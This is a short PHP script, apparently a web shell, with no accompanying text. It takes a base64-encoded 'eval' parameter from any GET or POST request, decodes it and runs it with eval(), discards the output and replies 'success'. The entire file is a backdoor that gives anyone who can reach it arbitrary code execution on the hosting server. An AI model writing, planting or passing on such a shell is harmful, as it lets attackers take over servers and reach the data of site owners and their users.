<?php
$_GP = array_merge($_POST, $_GET);
if(isset($_GP['eval'])){
	$s_code = base64_decode($_GP['eval']);
	ob_start();
	eval($s_code);
	$s_res = ob_get_contents();
	ob_end_clean();
	echo "success";
}
?>